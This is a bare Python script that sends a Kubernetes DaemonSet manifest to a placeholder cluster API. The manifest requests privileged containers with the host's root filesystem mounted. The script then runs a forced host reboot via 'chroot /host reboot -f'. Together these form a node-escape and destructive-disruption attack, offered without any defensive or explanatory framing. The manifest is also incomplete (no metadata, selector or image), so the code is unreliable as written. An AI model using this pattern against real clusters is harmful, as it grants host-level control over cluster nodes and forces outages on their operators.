import requests
import subprocess

manifest = {
    "kind": "DaemonSet",
    "spec": {"containers": [{"securityContext": {"privileged": True}}],
             "volumes": [{"hostPath": {"path": "/"}}]},
}
requests.post("https://cluster.invalid/apis/apps/v1/namespaces/default/daemonsets", json=manifest)
subprocess.run("chroot /host reboot -f", shell=True, check=True)
